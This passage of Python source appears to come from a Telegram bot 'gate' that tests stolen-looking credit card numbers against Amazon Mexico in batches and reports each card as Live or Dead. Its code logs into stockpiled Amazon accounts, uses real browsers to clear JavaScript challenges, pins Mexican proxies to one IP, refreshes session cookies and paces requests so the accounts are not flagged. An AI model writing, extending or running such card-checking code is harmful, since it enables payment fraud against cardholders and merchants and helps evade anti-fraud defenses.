      2. Login en navegador real (Browserless): lento (~90 s) pero resuelve
         los retos de JavaScript que el HTTP no puede.

    Devuelve None si no se pudo; en ese caso el mensaje lo arma el caller.
    """
    if not AMAZON_BROWSER_FALLBACK:
        return None

    loop = asyncio.get_running_loop()
    accounts = amazon_browserless.list_local_accounts(limit=_MAX_ACCOUNTS_TRY, country="MX")
    if not accounts:
        accounts = amazon_browserless.list_local_accounts(limit=_MAX_ACCOUNTS_TRY, country="")

    if not accounts:
        logger.info("Amazon gate: no hay cuentas locales para abrir sesión")
        return None

    last_detail = "No hay cuentas de Amazon disponibles para abrir sesión."
    last_status = "no_account"
    account_wall = False

    for account in accounts:
        email = account.get("email") or ""
        password = account.get("password") or ""
        country = (account.get("country") or "MX").upper()
        if country not in ("MX", "US"):
            country = "MX"

        # --- 1) Login HTTP ---
        def _http_login(email=email, password=password, country=country) -> Dict[str, str]:
            # El login y el flujo de tarjeta deben salir por la MISMA IP:
            # Amazon correlaciona el widget con la sesion que lo pidio.
            proxies = _pick_mx_proxy()
            try:
                session = amazon_login.open_prime_session(
                    email, password, proxies=proxies, country=country
                )
            except Exception as exc:  # pragma: no cover - red
                logger.exception("Amazon gate: fallo en login HTTP")
                return {"status": "error", "detail": f"Error en login HTTP: {exc}"}

            if session.usable:
                return {
                    "status": "ok",
                    "cookie": session.cookie,
                    "widget_state": session.widget_state,
                    "customer_id": session.customer_id,
                    "detail": session.detail,
                    "source": "http",
                    "proxy": proxies,
                }
            return {
                "status": session.status,
                "detail": session.detail,
                "phone_suffix": session.login.phone_suffix,
                "source": "http",
                "proxy": proxies,
            }

        result = await _run_blocking(_http_login)
        logger.info(
            "Amazon gate: login HTTP para %s -> %s (%s)",
            email, result.get("status"), result.get("detail"),
        )

        if result.get("status") == "ok":
            return result

        last_status = result.get("status", "error")
        last_detail = result.get("detail", "")

        # Muro de cuenta: otro cliente tampoco lo resuelve (y gastar una
        # corrida de navegador es caro), así que se corta aquí.
        if last_status in _ACCOUNT_LEVEL_WALLS:
            account_wall = True
            break

    # Muro de cuenta: no tiene sentido probar el navegador (mismo bloqueo).
    if account_wall:
        return {
            "status": last_status,
            "detail": last_detail,
            "source": "http",
        }

    # --- 2) Navegador local (Playwright): reutiliza el Chromium y no gasta
    # unidades de Browserless. Antes se comprueba que el pool de proxies
    # responde: si está caído, no se abre el navegador para nada.
    # OJO: va directo en el event loop (await), no en un executor: la API
    # async de Playwright está atada al loop donde se creó el navegador.
    pw_result: Optional[Dict[str, str]] = None
    try:
        pw_session = await amazon_playwright.open_prime_session(
            account.get("email") or "", account.get("password") or ""
        )
        if pw_session.usable:
            return {
                "status": "ok",
                "cookie": pw_session.cookie,
                "widget_state": pw_session.widget_state,
                "customer_id": pw_session.customer_id,
                "detail": pw_session.detail,
                "source": "playwright",
                "proxy": pw_session.proxy,
            }
        pw_result = {
            "status": pw_session.status,
            "detail": pw_session.detail,
            "source": "playwright",
        }
        last_status = pw_result["status"]
        last_detail = pw_result["detail"]
    except Exception as exc:  # pragma: no cover - navegador
        logger.warning("Amazon gate: fallo la sesión con Playwright: %s", exc)
        pw_result = {"status": "error", "detail": str(exc), "source": "playwright"}

    # --- 3) Browserless (residencial propio): último recurso ---
    client = amazon_browserless.BrowserlessClient()
    if not client.available:
        logger.info("Amazon gate: navegador no disponible (sin BROWSERLESS_TOKEN)")
        return {
            "status": last_status,
            "detail": last_detail,
            "source": "playwright",
        }

    try:
        browser_session = await _run_blocking(amazon_browserless.acquire_session)
    except Exception:  # pragma: no cover - red
        logger.exception("Amazon gate: fallo abriendo sesión en navegador")
        return None

    if browser_session.usable:
        return {
            "status": "ok",
            "cookie": browser_session.cookie,
            "widget_state": browser_session.widget_state,
            "customer_id": browser_session.customer_id,
            "detail": browser_session.detail,
            "source": "navegador",
        }

    return {
        "status": browser_session.status,
        "detail": browser_session.detail or last_detail,
        "source": "navegador",
        "previous_status": last_status,
        "previous_detail": last_detail,
    }


def _browser_failure_message(bootstrap: Optional[Dict[str, str]]) -> str:
    """Traduce el muro a un mensaje para el usuario."""
    if not bootstrap:
        return (
            "No hay sesión de Amazon disponible: la cookie guardada está muerta y "
            "no se pudo abrir una sesión nueva."
        )
    status = bootstrap.get("status")
    detail = bootstrap.get("detail") or ""
    if status == "suspended":
        return (
            "La cuenta de Amazon que se usó para abrir sesión está suspendida "
            f"({detail}). Genera otra cuenta con /gencookie."
        )
    if status == "cvf":
        suffix = bootstrap.get("phone_suffix") or ""
        extra = f" (celular ...{suffix})" if suffix else ""
        return (
            "Amazon pide verificar el número de celular (CVF) para iniciar sesión"
            f"{extra}. Verifica esa cuenta primero o genera otra con /gencookie."
        )
    if status == "otp":
        return (
            "Amazon pidió un código de verificación al iniciar sesión "
            f"({detail}). Verifica esa cuenta primero o genera otra con /gencookie."
        )
    if status == "bad_credentials":
        return "Amazon rechazó el correo o la contraseña de la cuenta de la sesión."
    if status == "waf":
        return f"Amazon mostró el muro WAF al iniciar sesión ({detail})."
    if status == "signin":
        return f"No se pudo establecer la sesión de Amazon ({detail})."
    if status == "no_account":
        return (
            "No hay cuentas de Amazon disponibles para abrir sesión. "
            "Genera una con /gencookie."
        )
    return detail or "No se pudo abrir sesión de Amazon."


# ---------------------------------------------------------------------------
# API pública async
# ---------------------------------------------------------------------------
# Clasificación a la que se traduce cada veredicto de la verificación.
_COOKIE_STATUS_EMOJI = {
    "expired": "❌ Expirada",
    "suspended": "🚫 Suspendida",
    "verification_required": "🔒 Verificacion",
    "captcha": "🤖 CAPTCHA",
    "network_error": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
    "unknown": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
    "valid": "✅ Live",
}

_COOKIE_ADVICE = {
    "valid": "La cookie está activa. Ya se puede usar en /amz.",
    "expired": "La sesión ya no existe en Amazon. Genera una cuenta nueva con /gencookie.",
    "suspended": "La cuenta está suspendida: la cookie no sirve aunque parezca viva. Genera otra con /gencookie.",
    "verification_required": "Amazon puso la cuenta en revisión (/ax/claim). Completa la verificación en amazon.com.mx o genera otra cuenta.",
    "captcha": "Amazon está cuestionando la IP o la cuenta. Espera un rato o cambia de proxy.",
    "network_error": "No se pudo contactar a Amazon. Revisa el proxy del gate.",
    "unknown": "Amazon respondió algo que no se pudo clasificar. Revisa data/amazon_debug/verify_cookie_*.txt.",
}


async def validate_amazon_cookie(cookie: str) -> Dict[str, str]:
    """Verifica una cookie de Amazon MX antes de guardarla o de usarla.

    Clasifica la sesión en:
      valid | expired | suspended | verification_required | captcha |
      network_error | unknown

    Devuelve {"status", "classification", "message", "advice"}.
    """
    if not cookie or not cookie.strip():
        return {
            "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
            "classification": "missing",
            "message": "No se recibió ninguna cookie.",
            "advice": "Pega la cookie completa de Amazon.",
        }

    cookie = cookie.strip()

    def _run() -> Tuple[bool, str, str]:
        session = _new_session()
        return _verify_cookie(session, cookie, _pick_mx_proxy())

    try:
        ok, classification, msg = await _run_blocking(_run)
    except Exception as exc:  # pragma: no cover - red
        logger.exception("Amazon: fallo validando la cookie")
        return {
            "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
            "classification": "network_error",
            "message": f"No se pudo validar la cookie: {exc}",
            "advice": _COOKIE_ADVICE["network_error"],
        }

    return {
        "status": _COOKIE_STATUS_EMOJI.get(classification, "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error"),
        "classification": classification,
        "message": msg,
        "advice": _COOKIE_ADVICE.get(classification, _COOKIE_ADVICE["unknown"]),
        "usable": "true" if ok else "false",
    }


async def amazon_check_cookie(user_id: Optional[int] = None) -> Dict[str, str]:
    """Verifica que la cookie guardada sea valida sin procesar tarjeta."""
    cookie = await _get_cookie_for_user(user_id)
    cookie_source = "usuario" if user_id and await get_amazon_cookie(user_id) else "global"
    logger.info("Amazon gate: check_cookie user_id=%s cookie_source=%s", user_id, cookie_source)
    if not cookie:
        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "No hay cookie de Amazon configurada. Guardala con /save <cookie> o /save respondiendo a un mensaje con la cookie."}

    loop = asyncio.get_event_loop()

    def _run() -> Dict[str, str]:
        session = _new_session()
        ok, classification, msg = _verify_cookie(session, cookie, _pick_mx_proxy())
        if not ok:
            status_emoji = "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error"
            if classification == "expired":
                status_emoji = "❌ Expirada"
            elif classification == "suspended":
                status_emoji = "🚫 Suspendida"
            elif classification == "verification_required":
                status_emoji = "🔒 Verificacion"
            elif classification == "captcha":
                status_emoji = "🤖 CAPTCHA"
            return {"status": status_emoji, "message": msg, "classification": classification}
        return {"status": "✅ Live", "message": f"Cookie valida ({cookie_source}).", "classification": "valid"}

    return await _run_blocking(_run)


def _clean_html(text: str) -> str:
    """Decodifica entidades HTML hasta estabilizar.

    Amazon entrega el markup del widget con doble escape (&amp;quot:).
    Sin esto, los regex de widgetState nunca coinciden aunque la página
    los traiga (verificado contra página viva 2026-10-09).
    """
    for _ in range(3):
        decoded = html.unescape(text)
        if decoded == text:
            break
        text = decoded
    return text


# Cuidar la sesión: Amazon marca más rápido cuando se le pega de más.
# Lecciones del flujo ZA aplicadas al MX:
# - Se cachea la verificación OK unos minutos para no repetir el home-GET en
#   cada tarjeta (el step1 de cada tarjeta sigue siendo el guardián real).
# - Si a mitad del lote la sesión se marca (expirada/suspendida/en revisión/
#   captcha/rate-limit), se detiene el lote en vez de seguir quemándola.
_VERIFY_TTL_S = 300
_verify_ok_until: Dict[int, float] = {}


def _session_verified_recently(user_id: Optional[int]) -> bool:
    """True si este usuario ya verificó OK dentro de la ventana TTL."""
    if user_id is None:
        return False
    return time.time() < _verify_ok_until.get(user_id, 0)


def _mark_session_verified(user_id: Optional[int]) -> None:
    if user_id is not None:
        _verify_ok_until[user_id] = time.time() + _VERIFY_TTL_S


def _forget_session_verified(user_id: Optional[int]) -> None:
    _verify_ok_until.pop(user_id, None)


def _is_session_failure(result: Dict[str, str]) -> bool:
    """True si el resultado indica sesión marcada, no veredicto de tarjeta.

    ✅ Live y ❌ Dead son veredictos (se sigue con el lote). Todo lo demás
    (expirada, suspendida, verificación, captcha, errores) detiene el lote
    para no quemar la cookie.
    """
    return result.get("status") not in ("✅ Live", "❌ Dead")


def _merge_cookie_string(stored: str, fresh: Dict[str, str]) -> str:
    """Fusiona las cookies que Amazon devolvió en la cookie guardada.

    Conserva el orden de la cookie original y solo actualiza/agrega
    los pares recibidos en Set-Cookie.
    """
    pairs: Dict[str, str] = {}
    order: List[str] = []
    for part in stored.split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        key, value = part.split("=", 1)
        key = key.strip()
        if not key or key in pairs:
            continue
        pairs[key] = value.strip()
        order.append(key)
    for key, value in fresh.items():
        if key not in pairs:
            order.append(key)
        pairs[key] = value
    return "; ".join(f"{key}={pairs[key]}" for key in order)


async def amazon_refresh_cookie(user_id: Optional[int] = None) -> Dict[str, object]:
    """Refresca la cookie guardada y devuelve las cookies nuevas SIN guardarlas.

    El guardado lo decide el usuario con el botón "Guardar cookies" del
    panel, igual que en el flujo de /gencookie. Lo guardado antes sigue
    intacto hasta que el usuario lo pise a mano.

    Diseño anti-suspensión:
      - UNA sola petición GET a la página principal (la misma URL liviana
        que usa la verificación), más la del re-chequeo. Sin POST, sin
        login, sin Prime y sin operaciones con tarjetas.
      - Se reutilizan los headers normales de navegador y la sesión se
        cierra en finally.
      - Sin reintentos en bucle: un intento por llamada. El cooldown entre
        llamadas lo aplica el handler (/checkcookies, botón Export).
    """
    cookie = await _get_cookie_for_user(user_id) if user_id else _get_cookie()
    if not cookie:
        return {
            "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
            "message": "No tienes cookies guardadas para exportar. Genera una cuenta con /gencookie o guarda una con /save.",
            "classification": "missing",
            "refreshed": False,
        }

    loop = asyncio.get_running_loop()

    def _run() -> Dict[str, object]:
        session = _new_session()
        try:
            headers = {**_HEADERS_BASE, "cookie": cookie}
            try:
                session.get(_AMAZON_VERIFY_URL, headers=headers, proxies=_pick_mx_proxy(), timeout=20)
            except _NETWORK_ERRORS as exc:
                logger.error("Amazon refresh: error de red -> %s", exc)
                return {
                    "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
                    "message": "No se pudo contactar a Amazon para refrescar. Intenta de nuevo en unos minutos.",
                    "classification": "network_error",
                    "refreshed": False,
                }
            # curl_cffi: los objetos Cookie están en session.cookies.jar
            # (session.cookies es dict-like: iterarlo devuelve los nombres).
            jar = getattr(session.cookies, "jar", None)
            source = jar if jar is not None else session.cookies
            fresh = {}
            for c in source:
                name = getattr(c, "name", None)
                value = getattr(c, "value", None)
                if name and value:
                    fresh[name] = value
            merged = _merge_cookie_string(cookie, fresh) if fresh else cookie
            ok, classification, msg = _verify_cookie(session, merged, _pick_mx_proxy())
            if not ok:
                status_emoji = "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error"
                if classification == "expired":
                    status_emoji = "❌ Expirada"
                elif classification == "suspended":
                    status_emoji = "🚫 Suspendida"
                elif classification == "verification_required":
                    status_emoji = "🔒 Verificacion"
                elif classification == "captcha":
                    status_emoji = "🤖 CAPTCHA"
                return {
                    "status": status_emoji,
                    "message": msg,
                    "classification": classification,
                    "refreshed": False,
                }
            return {
                "status": "✅ Live",
                "message": msg,
                "classification": "valid",
                "refreshed": merged != cookie,
                "cookie": merged,
            }
        finally:
            session.close()

    result = await _run_blocking(_run)
    # No se guarda nada en base de datos: el usuario decide con el botón
    # "Guardar cookies" del panel, igual que en el flujo de /gencookie.
    return result


async def amazon_check(
    card_data: str,
    user_id: Optional[int] = None,
    cookie: Optional[str] = None,
) -> Dict[str, str]:
    """Verifica una sola tarjeta contra Amazon MX.

    Orden de intento:
      1. Cookie guardada (del usuario o global). Es el camino rápido.
      2. Si la sesión está muerta O Prime devuelve el muro max_auth_age=0,
         se escala a un navegador real (Browserless) y se reintenta con el
         estado del widget que trajo ese navegador.

    `cookie` explícita tiene prioridad (sesión recién creada por /gencookie).
    """
    cookie_source = "directa"
    if not cookie:
        cookie = await _get_cookie_for_user(user_id)
        cookie_source = "usuario" if user_id and await get_amazon_cookie(user_id) else "global"
    logger.info("Amazon gate: inicio check user_id=%s cookie_source=%s", user_id, cookie_source)

    card_tuple = _validate_card(card_data)
    if not card_tuple:
        return {"status": "❌ Dead", "message": "Formato invalido. Usa cc|mes|año|cvv"}

    loop = asyncio.get_running_loop()

    def _run() -> Dict[str, str]:
        # Un solo proxy para toda la operación: verificar por una IP y
        # procesar por otra rompe la coherencia de la sesión.
        proxies = _pick_mx_proxy()
        session = _new_session()

        if cookie:
            if not _session_verified_recently(user_id):
                ok, classification, msg = _verify_cookie(session, cookie, proxies)
                if ok:
                    _mark_session_verified(user_id)
                else:
                    logger.warning(
                        "Amazon gate: validacion de cookie fallo -> %s (%s)", msg, classification
                    )
                    status_emoji = "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error"
                    if classification == "expired":
                        status_emoji = "❌ Expirada"
                    elif classification == "suspended":
                        status_emoji = "🚫 Suspendida"
                    elif classification == "verification_required":
                        status_emoji = "🔒 Verificacion"
                    elif classification == "captcha":
                        status_emoji = "🤖 CAPTCHA"
                    # La sesión guardada no sirve: se prueba el navegador.
                    return {
                        "status": status_emoji,
                        "message": msg,
                        "classification": classification,
                        "_dead_session": True,
                    }
            result = _process_card(session, card_tuple, 1, cookie, proxies)
            if _is_session_failure(result):
                _forget_session_verified(user_id)
            if result.get("classification") == "auth_wall":
                # Muro max_auth_age=0: la cookie guardada no alcanza.
                result["_dead_session"] = True
            return result

        return {
            "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
            "message": (
                "No hay cookie de Amazon configurada. Guardala con /save <cookie> "
                "o /save respondiendo a un mensaje con la cookie."
            ),
            "classification": "no_cookie",
            "_dead_session": True,
        }

    result = await _run_blocking(_run)

    # --- Escalado: si la sesión guardada no sirve, navegador real. ---
    if result.pop("_dead_session", False) and AMAZON_BROWSER_FALLBACK:
        logger.info("Amazon gate: escalando a sesion viva (login HTTP -> navegador real)")
        bootstrap = await _acquire_live_session()
        if bootstrap and bootstrap.get("status") == "ok":
            browser_cookie = bootstrap.get("cookie") or ""
            browser_state = {
                "widget_state": bootstrap.get("widget_state") or "",
                "customer_id": bootstrap.get("customer_id") or "",
            }
            loop2 = asyncio.get_running_loop()

            # Misma IP que la del login (ver _acquire_live_session).
            session_proxy = bootstrap.get("proxy") or _pick_mx_proxy()

            def _run_with_session() -> Dict[str, str]:
                session2 = _new_session()
                return _process_card(
                    session2,
                    card_tuple,
                    1,
                    browser_cookie,
                    session_proxy,
                    bootstrap=browser_state,
                )

            result = await _run_blocking(_run_with_session)
            result["session_source"] = bootstrap.get("source", "http")
        else:
            return {
                "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
                "message": _browser_failure_message(bootstrap),
                "classification": (bootstrap or {}).get("status", "browser_error"),
                "session_source": (bootstrap or {}).get("source", "http"),
            }

    return result


# Un solo lote masivo a la vez en TODO el bot.
#
# Antes cada /amzmass era una tarea suelta (`asyncio.create_task`) y nada
# impedía que dos lotes corriera a la vez: 20 tarjetas contra Amazon con el
# mismo proxy y la misma cookie es exactamente lo que hace que Amazon marque
# la cuenta. Además el trabajo bloqueante (HTTP) ocupaba hilos del executor
# por defecto del event loop.
#
# El candado se toma/release con try/finally para que una excepción no
# deje el gate bloqueado para siempre.
_MASS_LOCK = asyncio.Lock()

# Tope de tiempo de un lote: si se pasa, se corta y se reportan las tarjetas
# que faltaban (nunca se queda colgado sin avisar).
MASS_TIMEOUT_S = int(os.getenv("AMAZON_MASS_TIMEOUT_S", "600"))


async def amazon_check_multiple(
    cards_data: List[str],
    callback: Optional[Callable[[int, Dict[str, str], str, int], None]] = None,
    user_id: Optional[int] = None,
) -> List[Dict[str, str]]:
    """Verifica un lote de tarjetas contra Amazon MX.

    Una sola sesion para todo el lote (no una por tarjeta): el login en
    navegador real es lo caro, asi que si hay que escalar se escala UNA vez
    y se reusa el estado del widget para las 10 tarjetas.

    Solo puede haber UN lote a la vez en el bot (ver `_MASS_LOCK`): si ya hay
    uno corriendo, esta llamada devuelve el error sin tocar Amazon.
    """
    cards = [c.strip() for c in cards_data if c.strip()][:10]
    total = len(cards)
    results: List[Dict[str, str]] = []

    if total == 0:
        return []

    if _MASS_LOCK.locked():
        error = {
            "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
            "message": (
                "Ya hay un lote de Amazon corriendo. Espera a que termine "
                "antes de mandar otro."
            ),
            "classification": "busy",
        }
        results = [error] * total
        if callback:
            for i, card in enumerate(cards):
                await callback(i, error, card, 0)
        return results

    await _MASS_LOCK.acquire()
    try:
        return await _amazon_check_multiple_inner(cards, callback, user_id)
    finally:
        _MASS_LOCK.release()


async def _amazon_check_multiple_inner(
    cards: List[str],
    callback: Optional[Callable[[int, Dict[str, str], str, int], None]] = None,
    user_id: Optional[int] = None,
) -> List[Dict[str, str]]:
    """Cuerpo del lote masivo (ya tiene el candado tomado)."""
    total = len(cards)
    results: List[Dict[str, str]] = []
    loop = asyncio.get_event_loop()

    cookie = await _get_cookie_for_user(user_id)
    cookie_source = "usuario" if user_id and await get_amazon_cookie(user_id) else "global"
    logger.info(
        "Amazon gate: inicio mass user_id=%s cookie_source=%s total_cards=%d",
        user_id, cookie_source, total,
    )

    # --- Sesion a usar: cookie guardada o, si no sirve, navegador real. ---
    session_cookie = cookie
    bootstrap: Optional[Dict[str, str]] = None
    session_source = "guardada"
    session_proxy: Optional[dict] = None
    need_browser = False

    if not cookie:
        session_cookie = ""
        need_browser = True
    elif not _session_verified_recently(user_id):
        def _verify_cookie_once() -> Tuple[str, str]:
            session = _new_session()
            ok, classification, msg = _verify_cookie(session, cookie, _pick_mx_proxy())
            return classification, msg

        classification = "unknown"
        msg = "Error desconocido"
        try:
            classification, msg = await _run_blocking(_verify_cookie_once)
        except Exception as exc:
            msg = str(exc)

        if classification != "valid":
            logger.info("Amazon gate mass: cookie guardada inutilizable (%s)", classification)
            need_browser = True
            session_cookie = ""
        else:
            _mark_session_verified(user_id)

    if need_browser and AMAZON_BROWSER_FALLBACK:
        logger.info("Amazon gate mass: escalando a navegador real para el lote")
        browser = await _acquire_live_session()
        if browser and browser.get("status") == "ok":
            session_cookie = browser.get("cookie") or ""
            bootstrap = {
                "widget_state": browser.get("widget_state") or "",
                "customer_id": browser.get("customer_id") or "",
            }
            session_source = browser.get("source", "http")
            session_proxy = browser.get("proxy")
        else:
            error = {
                "status": "\u26a0\ufe0f Error",
                "message": _browser_failure_message(browser),
                "classification": (browser or {}).get("status", "browser_error"),
                "session_source": (browser or {}).get("source", "http"),
            }
            results = [error] * total
            if callback:
                for i, card in enumerate(cards):
                    await callback(i, error, card, 0)
            return results
    elif need_browser:
        error = {
            "status": "\u26a0\ufe0f Error",
            "message": (
                "No hay cookie de Amazon configurada y el escalado a navegador esta "
                "desactivado (AMAZON_BROWSER_FALLBACK=0)."
            ),
            "classification": "no_cookie",
        }
        results = [error] * total
        if callback:
            for i, card in enumerate(cards):
                await callback(i, error, card, 0)
        return results

    if not session_cookie:
        error = {"status": "\u26a0\ufe0f Error", "message": "No hay cookie de Amazon configurada. Guardala con /save <cookie> o /save respondiendo a un mensaje con la cookie."}
        results = [error] * total
        if callback:
            for i, card in enumerate(cards):
                await callback(i, error, card, 0)
        return results

    # Un solo proxy para todo el lote masivo, y el mismo que el del login
    # (si la sesion vino de un login en caliente).
    shared_proxies = session_proxy or _pick_mx_proxy()

    # Tope de tiempo del lote: el usuario siempre recibe el desenlace.
    deadline = time.monotonic() + MASS_TIMEOUT_S

    for i, card_data in enumerate(cards):
        if time.monotonic() > deadline:
            logger.warning(
                "Amazon mass: se pasó el tiempo del lote (%d s) en %d/%d",
                MASS_TIMEOUT_S, i, total,
            )
            stopped = {
                "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
                "message": (
                    f"El lote se detuvo por tiempo (más de {MASS_TIMEOUT_S // 60} min). "
                    "Las tarjetas que faltaban no se verificaron."
                ),
                "classification": "timeout",
            }
            for j in range(i, total):
                results.append(stopped)
                if callback:
                    try:
                        await callback(j, stopped, cards[j], 0)
                    except Exception:
                        logger.exception("Error en callback de Amazon mass")
            break

        card_tuple = _validate_card(card_data)
        if not card_tuple:
            result = {"status": "\u274c Dead", "message": "Formato invalido"}
        else:

            def _run_one(card_tuple=card_tuple, index=i + 1) -> Dict[str, str]:
                session = _new_session()
                return _process_card(
                    session, card_tuple, index, session_cookie, shared_proxies, bootstrap=bootstrap
                )

            result = await _run_blocking(_run_one)

        if session_source != "guardada":
            result["session_source"] = session_source
        results.append(result)

        if callback:
            try:
                await callback(i, result, card_data, 0)
            except Exception:
                logger.exception("Error en callback de Amazon mass")

        if _is_session_failure(result):
            # Sesion marcada a mitad del lote: detener para no quemarla mas.
            # Las restantes se reportan igual, sin pegarle a Amazon.
            logger.warning(
                "Amazon mass: sesion marcada (%s), deteniendo lote en %d/%d",
                result.get("status"), i + 1, total,
            )
            _forget_session_verified(user_id)
            stopped = dict(result)
            stopped["message"] = "Lote detenido para cuidar la sesion. " + result.get("message", "")
            for j in range(i + 1, total):
                results.append(stopped)
                if callback:
                    try:
                        await callback(j, stopped, cards[j], 0)
                    except Exception:
                        logger.exception("Error en callback de Amazon mass")
            break

        if i < total - 1:
            await asyncio.sleep(7)

    return results
